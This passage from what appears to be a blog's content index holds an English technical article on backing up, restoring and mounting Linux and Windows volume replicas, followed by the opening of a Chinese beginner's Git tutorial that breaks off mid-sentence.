volume information.</p>\n<h2 id=\"Using-POSIX-API-to-Read-Linux-Volume-Information\"><a href=\"#Using-POSIX-API-to-Read-Linux-Volume-Information\" class=\"headerlink\" title=\"Using POSIX API to Read Linux Volume Information\"></a>Using POSIX API to Read Linux Volume Information</h2><p>On Linux, all devices are mapped as files under the <code>/dev</code> directory. <code>/dev</code> contains block devices, character devices, whether virtual or physical. SATA devices are mapped as <code>/dev/sda</code>, <code>/dev/sdb</code>, <code>/dev/sdc</code>, and so on. NVMe SSD devices are mapped as <code>/dev/nvmen1</code>, <code>/dev/nvmen2</code>, and so forth. Partitions within block devices are distinguished by appending a number to the end, such as <code>/dev/sda1</code>, <code>/dev/sda2</code>, and so on. LVM volumes or other volumes managed by DeviceMapper are stored under <code>/dev/dm-X</code> and linked to <code>/dev/mapper/$dmDeviceName</code>.</p>\n<p>Volume devices on Linux are presented as block devices, supporting read and write operations based on offsets. Since Linux follows the principle of “everything is a file,” volumes can be treated as extremely large files for reading and writing—directly using the <code>open()</code>, <code>close()</code>, <code>read()</code>, <code>write()</code>, <code>flush()</code>, and <code>lseek()</code> interfaces provided by POSIX API. It is important to note that reading and writing to volume devices often require <code>root</code> group permissions. When performing backup operations, opening and reading the volume data in <code>O_RDONLY</code> mode can be done while the volume is mounted. However, when restoring volume data and opening it in <code>O_RDWR</code> mode to write volume information, the volume must be unmounted! Otherwise, an <code>EACCES</code> error will occur.</p>\n<p>To obtain the size of a volume on Linux, the <code>ioctl</code> command with <code>BLKGETSIZE64</code> can be used to read the size of the block device. Once the volume size is obtained, the data can be read and written in blocks.</p>\n<h2 id=\"Using-Win32-API-to-Read-Windows-Volume-Information\"><a href=\"#Using-Win32-API-to-Read-Windows-Volume-Information\" class=\"headerlink\" title=\"Using Win32 API to Read Windows Volume Information\"></a>Using Win32 API to Read Windows Volume Information</h2><p>The NT kernel to some extent also inherits the design philosophy of “devices are files” from Linux. For example, devices such as hard drives and optical drives have their own device paths, such as the drive device <code>\\Device\\PhysicalDriveX</code>, disk volume device <code>\\Device\\HarddiskVolumeX</code>, snapshot volume <code>\\Device\\VolumeShadowCopyX</code>, and optical drive device <code>\\Device\\CdRomX</code>. The <code>X</code> represents an incremented number. Paths starting with <code>\\Device</code> are DOS paths used only by the kernel, and user-mode programs generally use the soft links they map to, such as <code>\\Device\\HarddiskVolumeX</code> being mapped to <code>\\\\.\\HarddiskVolumeX</code>. When calling Win32 API functions in user mode, it is essential to use user-mode device paths.</p>\n<p>Windows does not have the concept of actively mounting. For volumes where common file systems (NTFS/FAT32/ExFAT) are present on Windows, as long as the device is connected, the file system will be automatically recognized. Volumes with recognized file systems can be accessed directly using the volume path regardless of whether they have obtained a drive letter. Whether to automatically obtain a drive letter is determined by partition properties. On Windows, <code>FindFirstVolumeW()</code> and <code>FindNextVolumeW()</code> can be used to enumerate all recognized volume names in GUID format. The corresponding device path for a volume name can be obtained using the <code>QueryDosDeviceW()</code> method. Reading and writing volume devices on Windows using Win32 API is similar to using POSIX API. The <code>CreateFile()</code> function is used to obtain the device handle for the opened volume path, and then the <code>ReadFile()</code> and <code>WriteFile()</code> functions are used to read and write the volume. Finally, the <code>CloseHandle()</code> function is used to close the handle.</p>\n<p>The Win32 API provides the <code>IOCTL_DISK_GET_LENGTH_INFO</code> command for <code>DeviceIoControl</code> calls to get the size of a volume. Other information about the volume can be obtained using <code>[GetVolumeInfomationByHandle()](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getvolumeinformationbyhandlew)</code> (involving volume serial number, volume name, and other attributes).</p>\n<h1 id=\"Snapshots-and-Consistent-Backups\"><a href=\"#Snapshots-and-Consistent-Backups\" class=\"headerlink\" title=\"Snapshots and Consistent Backups\"></a>Snapshots and Consistent Backups</h1><p>Mounted volumes may be written to by other processes during the backup process, causing the generated volume copy to be inconsistent. In file backups, this inconsistency often manifests in some files having meaningless content in the copy. In contrast, the inconsistency in volume backup copies is fatal: it renders the entire volume copy data invalid. Therefore, there are two main approaches to ensuring consistency in volume backups:</p>\n<ul>\n<li><p>Unmount the Volume: Unmount the volume associated with the file system before backing up the volume device. This method ensures that the data in the volume does not change during the backup process. This approach is commonly used in bare-metal backups. However, in a production environment, unmounting volume devices without interrupting business operations can be challenging. As a result, snapshots are used more frequently.</p>\n</li>\n<li><p>Volume Snapshot: Windows provides Volume Shadow Copy Service (VSS), and Linux’s Logical Volume Manager (LVM) offers snapshot capabilities, allowing the creation of a snapshot volume based on a particular volume. A snapshot volume is a type of logical volume, and during the actual backup process, data should be read from the snapshot volume and written to the copy to ensure the consistency of the volume copy.</p>\n</li>\n</ul>\n<h1 id=\"Backup-Engine-Implementation\"><a href=\"#Backup-Engine-Implementation\" class=\"headerlink\" title=\"Backup Engine Implementation\"></a>Backup Engine Implementation</h1><p>Previous sections introduced the basic concepts of volumes and the read/write interfaces, laying the foundation for the implementation of the volume backup engine. This section outlines the main processes of volume backup/restore, involving full backups, permanent incremental backups, and full restores. The reason for not implementing incremental backups is that the author believes that incremental copies of volumes do not add much value to data utilization. To mount a volume copy, a full copy needs to be restored first. Therefore, this section only discusses full backups and permanent incremental backups, while the restoration of copies only needs to consider full copies/synthetic full copies.</p>\n<h2 id=\"Scenario-Description\"><a href=\"#Scenario-Description\" class=\"headerlink\" title=\"Scenario Description\"></a>Scenario Description</h2><p>The volume backup engine should support the following three scenarios:</p>\n<ul>\n<li>Full Backup: Read all data from the volume, write it to the copy file, and generate corresponding metadata for the volume data.</li>\n<li>Permanent Incremental Backup: Read all data from the volume, compare it with the data in the full copy, overwrite only the modified parts based on the previous full copy, generate a <strong>synthetic full copy</strong>, and create new metadata for the synthetic full copy for the next permanent incremental backup.</li>\n<li>Volume Restore: Read data from the volume copy and write it to the volume device.</li>\n</ul>\n<p>The metadata includes basic information about the volume, such as size, mount point, device path, etc. To implement permanent incremental backups, the metadata also needs to include the checksum corresponding to the volume data on a block-by-block basis. For example, during backup, the volume is split into fixed-sized blocks (e.g., 4MB), and the SHA2 checksum for each block is calculated and stored. In the next incremental backup, the volume is split into blocks based on the block size used in the previous full backup, and the SHA2 for each block is calculated and compared. Only the blocks with changed SHA2 values are synchronously written to the new synthetic full copy. The choice of backup block size needs to balance performance and storage resource utilization.</p>\n<h2 id=\"Backup-and-Restore-Engine\"><a href=\"#Backup-and-Restore-Engine\" class=\"headerlink\" title=\"Backup and Restore Engine\"></a>Backup and Restore Engine</h2><p>In summary, the volume backup/restore process is a rather simple read-write flow. During backup, data is read from the volume device and written to the file. During restore, data is read from the file and written to the volume device. Considering the logic of full backups and permanent incremental backups, only an additional hashing process is needed before read and write to generate a full SHA2 checksum file and compare the checksum of the previous blocks during incremental backups to decide whether to perform the write operation.</p>\n<p>Therefore, the backup engine can consist of three components: Reader, Hasher, and Writer, responsible for reading data, hashing data, and writing data, respectively. The <code>hasherQueue</code> and <code>writerQueue</code> are used as blocking queues for communication between the Reader and Hasher, as well as the Hasher and Writer. After the Reader is started, it opens a volume or a copy file, and the main thread continuously reads data in 4MB chunks, pushing the data into the <code>hasherQueue</code>. The Hasher subscribes to <code>hasherQueue</code>, continuously pops data blocks, calculates the SHA2 checksum for each block, and if it’s an incremental backup scenario, compares the checksum of the block at the corresponding position in the previous full copy. If there is a difference, it is pushed to the <code>writerQueue</code>. If it’s a full backup or there’s no need for comparison, it is directly pushed to the <code>writerQueue</code>. After the Writer is started, it opens the volume or copy file, and the main thread subscribes to <code>writerQueue</code>, continuously pops data blocks, and writes them to the target location.</p>\n<pre class=\"mermaid\">sequenceDiagram\n  participant Reader\n  participant Hasher\n  participant Writer\n\n  Reader->>Hasher: Read 4MB Data\n  Hasher->>Hasher: Calculate SHA2 checksum\n  Hasher->>Writer: Push Data to writerQueue (if different)\n\n  alt Incremental Backup\n    Hasher-->>Hasher: Compare with previous checksum\n  end\n\n  Writer->>Writer: Write Data</pre>\n\n<p>The volume recovery process involves only the Reader and Writer, utilizing the readQueue to communicate between them. Hasher and HasherQueue are not required.</p>\n<p>The implementation of this process in <a href=\"https://github.com/XUranus/VolumeBackup\">VolumeBackup</a> uses segmented backup in the form of a sliding window. Since a volume can be large, the backup time for a single volume can be lengthy. To address this, the backup task for a volume is split into multiple backup subtasks, allowing each subtask to back up a segment of the volume. Within a single subtask, checkpoints are recorded, enabling restart in case of subtask failure to enhance availability. Segmented backup also allows the segmented storage of meta and checkpoint files, facilitating loading into memory at once. When the replica type is set to <code>CopyFormat::BIN</code>, segmented backup generates replica files that are split into multiple sliced replica files based on the window size. This facilitates storing replica files on file systems with a single-file size limit, such as FAT32.</p>\n<h1 id=\"Volume-Replica-Mounting\"><a href=\"#Volume-Replica-Mounting\" class=\"headerlink\" title=\"Volume Replica Mounting\"></a>Volume Replica Mounting</h1><p>The data of a backed-up volume often appears in the form of a disk binary image. To access and utilize the data, the volume needs to be mounted as a file system from the image. Therefore, mounting is a prerequisite for utilizing the data of a volume replica. The previously mentioned volume backup scheme involves segmented backup, resulting in one or more sliced replica files for a volume. Thus, the mounting solution for such replicas needs to support mounting from one or multiple sliced replica files. This chapter discusses the advantages and limitations of various mounting solutions for volume replica images on Windows and Linux.</p>\n<h2 id=\"Image-Files\"><a href=\"#Image-Files\" class=\"headerlink\" title=\"Image Files\"></a>Image Files</h2><p>Commonly used disk image files for mounting include <code>*.bin</code>, <code>*.iso</code>, <code>*.img</code>, <code>*.dmg</code>, and similar formats. Among them, <code>*.bin</code> is a non-standard format without universally accepted specifications or a standard opening method (the sliced replica files generated by the backup engine mentioned earlier follow this format, using <code>$start.$length.copydata.bin</code> as the filename). The other three formats generally have defined standards and are supported by major operating systems. Before discussing volume replica mounting solutions, it’s essential to understand the practical definitions of these formats.</p>\n<ol>\n<li>ISO:<br>ISO files are typically images of optical discs and must adhere to the <a href=\"https://en.wikipedia.org/wiki/ISO_9660\">ISO 9660</a> or <a href=\"https://en.wikipedia.org/wiki/Universal_Disk_Format\">UDF</a> format standards. ISO files have headers and data segments. ISO 9660/UDF should be treated as independent file systems. Clearly, this format of ISO files is not suitable for universal hard disk image mounting. On Windows, these ISO files can be mounted by double-clicking, assigning a drive label. Alternatively, they can be mounted using Win32 API calls like <a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddcdrm/ni-ntddcdrm-ioctl_cdrom_load_media\">IOCTL_CDROM_LOAD_MEDIA_IOCTL</a>. On Linux, the files can be mounted using <code>mount -o loop</code> or <code>mount -t iso8660</code>.</li>\n</ol>\n<p>There are also ISO files that do not adhere to the ISO 9660/UDF format standards. They may be sector-by-sector copies of the disk. Windows does not support directly mounting these files; third-party tools like ImDisk are needed. These sector-by-sector copy files should actually be classified as IMG files.</p>\n<!--more-->\n<ol>\n<li>IMG:<br>IMG format is generally a sector-by-sector copy of the entire disk, providing a complete description of the volume’s information. Windows typically requires third-party software to mount these files. Mounting IMG files is common in electronic forensics scenarios. <a href=\"https://www.hackingarticles.in/multiple-ways-to-mount-raw-images-windows/\">Mutiple Ways To Mount Raw Image Windows</a> introduces several third-party mounting tools for these files, such as <a href=\"https://www.osforensics.com/tools/mount-disk-images.html\">OSFMount</a>, <a href=\"https://arsenalrecon.com/products/arsenal-image-mounter\">Arsenal Image Mounter</a>, <a href=\"https://github.com/LTRData/ImDisk\">ImDisk</a>, and others.</li>\n</ol>\n<p>On Linux, mounting such files can be done by first creating a loop device using <code>losetup</code> and then using the <code>mount</code> command to specify the file system type and other mounting parameters for the corresponding loop device. For example:<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo mkdir /mnt/imagemount</span><br><span class=\"line\">sudo losetup $(losetup -f) /path/to/imagefile.img <span class=\"comment\"># bind /dev/loopX to imagefile.img</span></span><br><span class=\"line\">sudo mount -t ext4 -o ro /dev/loopX /mnt/imagemount <span class=\"comment\"># specify fs type, mount option, loop device, and image path</span></span><br></pre></td></tr></table></figure></p>\n<ol>\n<li>DMG:<br>As a common image format on MacOS, DMG is only supported on MacOS.</li>\n</ol>\n<h2 id=\"Mounting-Solutions\"><a href=\"#Mounting-Solutions\" class=\"headerlink\" title=\"Mounting Solutions\"></a>Mounting Solutions</h2><p>By comparing the differences between various common image files, we can conclude that the volume replicas generated in our volume backup, containing any file system, are closer to the IMG format. For such sector-by-sector copy files, Linux can use the loopback device driver for mounting, while Windows requires alternative solutions, such as the introduction of third-party tools like ImDisk.</p>\n<p>Due to the introduction of the concept of <strong>slices</strong> in our volume replicas (a volume replica consists of one or more fragments that save different positions of the volume), our mounting process becomes more complex. Next, we will compare the advantages and disadvantages of several volume replica mounting solutions on Linux and Windows in this context.</p>\n<h3 id=\"Linux-Mounting-Based-on-loopback-Device-devicemapper\"><a href=\"#Linux-Mounting-Based-on-loopback-Device-devicemapper\" class=\"headerlink\" title=\"Linux Mounting Based on loopback Device/devicemapper\"></a>Linux Mounting Based on loopback Device/devicemapper</h3><p>On Linux, replica files can be associated (attached) with a loopback device. The loopback module will bind a <code>/dev/loopX</code> block device path (where <code>X</code> is a number) to each associated device, and this device path can be used for subsequent mounting. If the replica contains only one image file, and that unique image file contains the entire volume, it can be mounted directly:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo mkdir /mnt/imagemount</span><br><span class=\"line\">sudo losetup $(losetup -f) /path/to/imagefile.bin <span class=\"comment\"># bind /dev/loopX to imagefile.bin</span></span><br><span class=\"line\">sudo mount -t ext4 -o ro /dev/loopX /mnt/imagemount <span class=\"comment\"># specify fs type, mount option, loop device, and image path</span></span><br></pre></td></tr></table></figure>\n<p>Here, <code>losetup -f</code> is used to return an available loopback device path, such as <code>/dev/loop0</code>. <code>sudo losetup /dev/loop0 /path/to/imagefile.bin</code> associates <code>imagefile.bin</code> with <code>/dev/loop0</code>, with the default sector size being 512B. All I/O to <code>/dev/loop0</code> will be mapped to the associated <code>imagefile.bin</code> file.</p>\n<p>If the replica consists of multiple image files, for example, a 3GB replica is split into 3 slices of 1GB each, stored as:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">/path/to/imagefile.0.1073741824.bin</span><br><span class=\"line\">/path/to/imagefile.1073741824.1073741824.bin</span><br><span class=\"line\">/path/to/imagefile.2147483648.1073741824.bin</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><code>imagefile.0.1073741824.bin</code> denotes a length of 1073741824 bytes starting from 0, and <code>imagefile.1073741824.1073741824.bin</code> denotes a length of 1073741824 bytes starting from 1073741824, and so on.</p>\n</blockquote>\n<p>Linux provides the devicemapper driver to create logical devices, where the ability to create a <code>linear</code> device can be used to create a spanned volume across multiple volume devices. For the aforementioned replica composed of three files, each can be mounted as separate loopback block devices: <code>/dev/loop0</code>, <code>/dev/loop1</code>, <code>/dev/loop2</code>. Each device has 1073741824B / 512B = 2097152 sectors. Using the <code>dmsetup</code> command-line tool, a <code>linear</code> target device can be created with the <code>dm-sample-tbl.txt</code> file describing the start sector, sector count, type (<code>linear</code>), block device path, and target block device’s start sector for each mapping target block device:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">0 2097152 linear /dev/loop0 0</span><br><span class=\"line\">2097152 2097152 linear /dev/loop1 0</span><br><span class=\"line\">4194304 2097152 linear /dev/loop2 0</span><br></pre></td></tr></table></figure>\n<p>Then, use <code>dmsetup create sample-volume dm-sample-tbl.txt</code> to create a dm volume named <code>sample-volume</code>. If successful, a device with the path <code>/dev/mapper/sample-volume</code> will be created under <code>/dev/mapper</code>. Afterward, this device can be mounted using the <code>mount</code> command.</p>\n<pre class=\"mermaid\">graph TD\n  subgraph Volume Copy\n    A[Check Number of Image Files]\n    B[Is there only one image file?]\n    C[Attach Image File to Loop Device]\n    D[Mount Loop Device]\n    E[Done]\n    F[Attach All Image Files to Loop Devices]\n    G[Create Linear DM Device]\n    H[Mount DM Device]\n  end\n\n  A -->|Yes| B\n  B -->|Yes| C\n  C --> D\n  D --> E\n  B -->|No| F\n  F --> G\n  G --> H\n  H --> E</pre>\n\n<h2 id=\"Mounting-Solutions-1\"><a href=\"#Mounting-Solutions-1\" class=\"headerlink\" title=\"Mounting Solutions\"></a>Mounting Solutions</h2><p>In the AOSP source code, examples of creating, deleting, and finding devicemapper volumes using the user-space API in <code>dm-ioctl.h</code> are provided. You can refer to the code at <a href=\"https://android.googlesource.com/platform/system/core/+/refs/heads/main/fs_mgr/libdm\">https://android.googlesource.com/platform/system/core/+/refs/heads/main/fs_mgr/libdm</a>.</p>\n<p>Mounting volume replicas on Linux using loopback devices and devicemapper allows for in-place mounting with zero copying. This can be considered a relatively ideal mounting solution.</p>\n<h3 id=\"Windows-Mounting-Based-on-VHD\"><a href=\"#Windows-Mounting-Based-on-VHD\" class=\"headerlink\" title=\"Windows Mounting Based on VHD\"></a>Windows Mounting Based on VHD</h3><p>On Windows, only images that comply with ISO 9660/UDF standards can be directly mounted. Other images can only be mounted directly in the form of Virtual Hard Disk (VHD) files. VHD/VHDX is a virtual disk technology provided by Windows for creating virtual disks from files, similar to the loopback device in Linux. However, compared to the loopback device, both VHD and VHDX have additional headers and footers used to record disk metadata (size, version, etc.). VHD/VHDX supports fixed-length volumes or dynamically sized volumes. Fixed-length volumes allocate space on the disk when creating the VHD/VHDX file, while dynamic volumes only create a portion of the space initially and expand the file size as needed based on subsequent writes. Dynamic disk files, in addition to basic Header/Footer, also require maintaining a block allocation table, making them have a more complex file structure.</p>\n<p>VHD format is not supported by Linux, and the dynamic disk file format cannot describe the original volume information sector-by-sector. Therefore, it <strong>cannot be used as a cross-platform replica storage solution</strong>. VHD can be used for older Windows versions, supporting a maximum volume size of 2040GB. VHDX files are supported after Windows Server 2012, with a maximum volume size of 64TB and a more complex file structure. VHD files also do not support slicing, so a new VHD/VHDX file needs to be created from the replica slice before mounting, resulting in 1x <strong>additional space consumption</strong>.</p>\n<blockquote>\n<p>The article <a href=\"https://leonzandman.com/2007/10/26/splitting-a-virtual-pc-vhd/\">Splitting a Virtual PC VHD</a> mentions that VHD slicing (naming as <code>.v01</code>, <code>.v02</code>, etc.) is only suitable for scenarios where Hyper-V virtual machines are read and cannot be used for general host mounting.</p>\n</blockquote>\n<p><a href=\"https://github.com/XUranus/VolumeBackup\">VolumeBackup</a> uses the approach of backing up Windows volumes into VHD and VHDX formats. <code>VirtDisk.h</code> provides APIs for operating on VHD/VHDX. The process of writing data to a virtual disk file is as follows:</p>\n<ol>\n<li>Use <code>CreateVirtualDisk()</code> to create a virtual disk file, specifying the disk size and type (dynamic or fixed-length). In reality, the disk size needs to be larger than the volume’s size to reserve space for GPT/MBR partition tables. Additionally, GPT-formatted disks in Windows require creating a Header MSR (Microsoft Reservation) partition and a 2MB reserved partition at the end of the disk.</li>\n<li>Use <code>OpenVirtualDisk()</code> to open the virtual disk file and obtain the handle. Then use <code>AttachVirtualDisk()</code> to load the dynamic disk. At this point, the virtual disk will be assigned a disk device path <code>\\\\.\\PhysicalDriveX</code>.</li>\n<li>Open the disk based on the disk device path, obtain the disk handle, use <code>IOCTL_DISK_CREATE_DISK</code> to initialize the disk as a GPT format, and use <code>IOCTL_DISK_SET_DRIVE_LAYOUT_EX</code> to initialize the MSR and replica data partitions. Upon success, the replica data partition will be automatically mounted and assigned a volume device path <code>\\\\.\\HarddiskVolumeX</code>.</li>\n<li>Use <code>CreateFile()</code> to open the volume device path and obtain the volume device handle, allowing regular file I/O for reading and writing to the volume device. After reading and writing are complete, use <code>DetachVirtualDisk()</code> to unmount the virtual disk.</li>\n</ol>\n<p>The process of recovering data from VHD/VHDX format replicas is similar; just attach the virtual disk using <code>AttachVirtualDisk()</code> and obtain the replica volume device path.</p>\n<p>The partition format of GPT virtual disk replicas used by <a href=\"https://github.com/XUranus/VolumeBackup\">VolumeBackup</a> is as follows:</p>\n<p><img src=\"GPTPartition.drawio.png\" alt=\"GPT Partition Format\"></p>\n<blockquote>\n<p>In practical testing, fixed-length VHD/VHDX disks are created without size limitations. The terms “VHD 2040GB” and “VHDX 64TB” apply only to dynamic disks. Therefore, using VHD/VHDX format replicas for storing Windows volume replicas is a feasible backup solution. After initializing the GPT partition using <code>IOCTL_DISK_CREATE_DISK</code>, a <code>sleep</code> of a few seconds is required before executing <code>IOCTL_DISK_SET_DRIVE_LAYOUT_EX</code> to successfully initialize all partitions. This part of the MSDN documentation is not very clear, and the author has not found a solution: <em>When specifying a GUID partition table (GPT) as the PARTITION_STYLE of the CREATE_DISK structure, an application should wait for the MSR partition arrival before sending the IOCTL_DISK_SET_DRIVE_LAYOUT_EX control code. For more information about device notification, see RegisterDeviceNotification</em>. <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/winioctl/ni-winioctl-ioctl_disk_create_disk\">https://learn.microsoft.com/en-us/windows/win32/api/winioctl/ni-winioctl-ioctl_disk_create_disk</a></p>\n</blockquote>\n<h3 id=\"Windows-Mounting-Based-on-ImDisk\"><a href=\"#Windows-Mounting-Based-on-ImDisk\" class=\"headerlink\" title=\"Windows Mounting Based on ImDisk\"></a>Windows Mounting Based on ImDisk</h3><p>For Windows, a mounting solution that does not require copying the replica and is not constrained by the replica’s size seems to be limited to the use of third-party tools, with ImDisk being one example. By reading the <a href=\"https://github.com/LTRData/ImDisk\">ImDisk source code</a>, it is evident that ImDisk registers a driver in the Windows kernel to create a virtual disk. The driver translates all I/O requests to this virtual disk into corresponding file I/O requests, similar to implementing a loopback device on Windows. However, since writing a driver involves kernel development and any slight mistake could lead to a production environment crash, this solution is not recommended.</p>\n<h1 id=\"Reference：\"><a href=\"#Reference：\" class=\"headerlink\" title=\"Reference：\"></a>Reference：</h1><ul>\n<li><a href=\"https://en.wikipedia.org/wiki/Device_mapper\">Device mapper - Wikipedia</a></li>\n<li><a href=\"https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/logical_volume_manager_administration/device_mapper\">Appendix A. The Device Mapper</a></li>\n<li><a href=\"https://www.minitool.com/partition-disk/volume-vs-partition.html\">What’s the Difference Between Volume and Partition on Windows OS?</a></li>\n<li><a href=\"http://pig.made-it.com/devicemapper.html\">The Device Mapper</a></li>\n<li><a href=\"https://android.googlesource.com/platform/system/core/+/refs/heads/main/fs_mgr/libdm\">AOSP libdm</a></li>\n<li><a href=\"https://www.hackingarticles.in/multiple-ways-to-mount-raw-images-windows/\">Mutiple Ways To Mount Raw Image Windows</a></li>\n<li><a href=\"https://www.osforensics.com/tools/mount-disk-images.html\">OSFMount</a></li>\n<li><a href=\"https://arsenalrecon.com/products/arsenal-image-mounter\">Arsenal Image Mounter</a></li>\n<li><a href=\"https://github.com/LTRData/ImDisk\">ImDisk GitHub</a></li>\n</ul>\n","tags":["DataProtect"]},{"title":"Git使用入门","url":"/2017/10/09/Git%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/","content":"<blockquote>\n<p>本文主要是复现一遍<a href=\"https://www.liaoxuefeng.com/wiki/896043488029600\">廖雪峰的Git教程</a>中的操作，初学Git强烈建议阅读这篇教程！</p>\n</blockquote>\n<h2 id=\"安装与配置\"><a href=\"#安装与配置\" class=\"headerlink\" title=\"安装与配置\"></a>安装与配置</h2><h3 id=\"安装Git\"><a href=\"#安装Git\" class=\"headerlink\" title=\"安装Git\"></a>安装Git</h3><ol>\n<li><p>Linux下的安装:</p>\n<ul>\n<li>ArchLinux: <code>sudo pacman -S git</code></li>\n<li>Debian: <code>sudo apt-get install git</code></li>\n<li>特别老的Linux: <code>sudo apt install git-core</code></li>\n</ul>\n</li>\n<li><p>Win/Mac的安装可以去<a href=\"https://git-scm.com/\">Git官网</a>下载安装包。</p>\n</li>\n</ol>\n<h3 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h3><p>安装完成后，还需要进一步设置，首先配置用户名邮箱：<br><code>git config --global user.name &quot;your name</code><br><code>git config --global user.email &quot;email@example.com</code></p>\n<p><code>--global</code>参数表示全局配置：你这台机器上所有的Git仓库都会使用这个配置。</p>\n<p>对于全局配置Git将其保存在Linux的<code>$HOME/.gitconfig</code>以及Windows的<code>%GIT%/etc/gitconfig</code>下，而具体项目的Git配置则位于项目的<code>.git/config</code>下。可以直接在配置文件中查看和修改当前Git的配置。</p>\n<span id=\"more\"></span>\n<h2 id=\"创建版本库\"><a href=\"#创建版本库\" class=\"headerlink\" title=\"创建版本库\"></a>创建版本库</h2><p>版本库又称Repository，接下来以在本地创建一个新项目”learngit”为例，展现创建版本库的过程：</p>\n<ol>\n<li>创建一个目录<br><code>mkdir learngit</code>  </li>\n<li>初始化git仓库<br>进入目录：<code>cd learngit</code>，在目录下初始化Git仓库：<code>git init</code>，此时会在目录下自动生成一个<code>.git</code>隐藏文件夹，这就是本地的版本库。</li>\n<li>创建文件<br><code>echo &quot;this is a README file&quot; &gt; README.md</code></li>\n<li>把文件添加到Git仓库<br><code>git add README.md</code>  </li>\n<li>把位于暂存区的文件提交到Git仓库，-m后写上本次提交的说明（改动记录）<br><code>git commit -m &quot;first commit&quot;</code></li>\n</ol>\n<p>创建Git版本库时，Git自动为我们创建了唯一一个<code>master</code>分支，所以现在<code>git commit</code>就是默认往<code>master</code>分支上提交更改。</p>\n<h2 id=\"版本控制\"><a href=\"#版本控制\" class=\"headerlink\" title=\"版本控制\"></a>版本控制</h2><p>每当文件修改到一定程度的时候，就可以“保存一个快照”，这个快照在Git中被称为commit。当想回滚到某个历史版本时就可以从一个commit恢复，然后继续工作。</p>\n<p>加入我们要修改一个文件为2.0版本：<br><code>echo &quot;this is a README file v2.0&quot; &gt; README.md</code><br>重新add：<br><code>git add README.md</code><br>再次commit：<br><code>git commit -m &quot;edit version to v2.0&quot;</code><br>之后又进行了一次更新，改为3.0版本，再来一次上述操作：<br><code>echo &quot;this is a README file v3.0&quot; &gt; README.md</code><br><code>git add README.md</code><br><code>git commit -m &quot;edit version to v3.0&quot;</code> </p>\n<p>此时连同第一次一共完成了三次commit，可以使用<code>git log</code>查看这三次commit记录：<br><img src=\"Screenshot_20201027_094129.png\" alt=\"\"></p>\n<p>也可以用<code>git log --pretty=oneline</code>来简洁的显示</p>\n<p><img src=\"Screenshot_20201027_094556.png\" alt=\"\"></p>\n<p>其中的hash码是SHA1计算出的commit id。<code>HEAD</code>指向最近的一次的commit，分支为<code>master</code>。上一个版本就是<code>HEAD^</code>，上上一个版本就是<code>HEAD^^</code>，以此类推。当然往上100个版本写100个<code>^</code>比较容易数不过来，所以写成<code>HEAD~100</code>。使用<code>HEAD</code>参照就可以定位之前某次提交的记录。</p>\n<h3 id=\"回退到上一个版本\"><a href=\"#回退到上一个版本\" class=\"headerlink\" title=\"回退到上一个版本\"></a>回退到上一个版本</h3><p>如果一个版本写出了重大BUG/设计缺陷想放弃这个版本，亦或是误删了上个版本的文件，可以使用版本回退来回到过去。例如回到上一个版本：<br><code>git reset --hard HEAD^</code><br>此时<code>cat README.md</code>可以看到：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ cat README.md</span><br><span class=\"line\">this is README.md file v2.0</span><br></pre></td></tr></table></figure><br>说明已经回到了上一次commit的版本了。如果此时<code>git log</code>则会发现<code>HEAD</code>指针已经指向了第二次提交的结果。</p>\n<p><img src=\"Screenshot_20201027_095643.png\" alt=\"\"></p>\n<h3 id=\"撤销到未来的版本\"><a href=\"#撤销到未来的版本\" class=\"headerlink\" title=\"撤销到未来的版本\"></a>撤销到未来的版本</h3><p>如果想再次回到未来，由于用<code>HEAD</code>无法定位未来的版本，则需要未来版本的commit id。此时<code>git log</code>可以看到上次最新的commit已经消失，想要回到未来则需要未来版本的commit id来定位:<code>git reset --hard 4419908</code>，commit id只需要输入前几位，然后按<code>Tab</code> Git会自动补全。</p>\n<p>为了防止找不到过去的commit id，Git提供了一个命令<code>git reflog</code>用来记录你的每一次命令。</p>\n<h3 id=\"比较文件区别\"><a href=\"#比较文件区别\" class=\"headerlink\" title=\"比较文件区别\"></a>比较文件区别</h3><p>把<code>README.md</code>中的内容改成如下<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Git is a distributed version control system.</span><br><span class=\"line\">Git is free software distributed under the GPL.</span><br></pre></td></tr></table></figure><br>然后执行一次commit，再次修改，在文件头部加两行：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Learn Git</span><br><span class=\"line\">I&#x27;m writing this README.md to learn Git.</span><br><span class=\"line\">Git is a distributed version control system.</span><br><span class=\"line\">Git is free software distributed under the GPL.</span><br></pre></td></tr></table></figure><br>再次commit。两次修改可以看到被修改的文件数，增加和删除的行。Git才有一种近似LCS的文件diff算法。<br><img src=\"Screenshot_20201027_101532.png\" alt=\"\"></p>\n<p>用<code>git diff HEAD^ -- README.md</code>命令可以查看工作区和版本库里面版本的区别：<br><img src=\"Screenshot_20201027_101858.png\" alt=\"\"></p>\n<p>扩展知识：</p>\n<blockquote>\n<ul>\n<li><code>git diff &lt;branch1&gt; &lt;branch2&gt;</code> 查看分支区别</li>\n<li><code>git diff &lt;branch1&gt;..&lt;branch2&gt; --name-status</code> 查看分支差异（只查看文件列表）</li>\n<li><code>git diff --cached</code> 查看暂存区文件和上次提交的区别</li>\n<li><code>git diff &lt;path&gt; &lt;origin/path&gt;</code> 查看本地文件和远端文件的区别</li>\n</ul>\n</blockquote>\n<h3 id=\"工作区与暂存区\"><a href=\"#工作区与暂存区\" class=\"headerlink\" title=\"工作区与暂存区\"></a>工作区与暂存区</h3><p><code>git add &lt;file&gt;</code>操作可以进行多次，<code>git add .</code>可以add当前目录下所有的文件。</p>\n<p>修改后没有add的文件位于<strong>工作区（working tree）</strong>，被add后的文件会被存入<strong>暂存区（stage）</strong>。使用<code>git 